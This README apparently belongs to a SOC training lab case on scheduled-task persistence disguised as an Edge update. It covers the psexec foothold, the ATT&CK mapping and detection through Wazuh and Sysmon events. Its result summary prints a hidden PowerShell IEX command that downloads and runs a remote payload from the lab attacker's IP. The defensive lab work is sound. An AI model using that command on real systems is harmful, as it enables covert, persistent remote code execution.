# SOC Case — Scheduled Task Persistence (Masqueraded as Edge Update)

**Week:** 1 — Windows Fundamentals
**Lab:** Attacker (`192.168.100.106`, `BUTCH`) → Windows 10 Home (`192.168.100.108`, agent `winhome01` / `DESKTOP-F0JVTQT`), detected by Wazuh SIEM (`192.168.100.102`) with Sysmon + Security auditing
**ATT&CK:** T1053.005 (Scheduled Task), T1036 (Masquerading — task named like Edge update), T1105 (Ingress Tool Transfer — IEX payload), T1564.003 (Hidden Window — `-w hidden`)
**Severity:** **High** — persistent SYSTEM-level execution established (runs every 5 min), masqueraded and hidden
**Status:** ✅ Completed (2026-10-28)

## Case Structure

| File | Contents |
|---|---|
| `01-Scenario.md` | Background, audit policy setup |
| `02-Attack-Simulation.md` | Kali step-by-step (psexec → schtasks create/query/run/delete) |
| `03-Alert.md` | Events detected: 4698, Sysmon 1 (schtasks), Sysmon 11 (task file) |
| `04-Indicators.md` | IOCs: task name, command line, file path, hashes, XML |
| `05-Investigation.md` | Triage in Wazuh + evidence list |
| `06-Timeline.md` | Real event timeline |
| `07-Analysis.md` | Persistence chain, masquerading, hidden task, detection gaps |
| `08-Conclusion.md` | Findings, severity, lessons |
| `09-Remediation.md` | Hardening + custom Wazuh rule |
| `evidence/` | 9 screenshots |
| `kali-commands.txt` | Exact commands run |

## Result Summary (actual, from evidence)

- **Foothold:** `impacket-psexec v0.14.0` (adminlab) → SYSTEM shell (uploaded `TVMxBfgf.exe`, service `rPEs`). Windows 10 Build 19045.2846.
- **Task created:** `\MicrosoftEdgeUpdateTask` (masquerades as Edge update) via `schtasks /create`, runs as **SYSTEM**, schedule **every 5 minutes**, **Hidden=true**.
- **Task action:** `powershell.exe -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://192.168.100.106/payload.ps1')"` — downloads and executes remote payload on each trigger.
- **Task executed:** `schtasks /run` → payload fired. Task later deleted (`schtasks /delete /f`).
- **Detection (3 layers):**
  - **Event ID 4698** (Security) — "A scheduled task was created", full task XML logged (2 events). Subject: SYSTEM (DESKTOP-F0JVTQT$).
  - **Sysmon Event ID 1** — `schtasks.exe` (32-bit, SysWOW64) process creation with full command line; SwiftOnSecurity auto-tagged **T1053.005 Scheduled Task**. Hashes captured.
  - **Sysmon Event ID 11** — file `C:\Windows\System32\Tasks\MicrosoftEdgeUpdateTask` created by `svchost.exe` (Task Scheduler), tagged T1053.005.
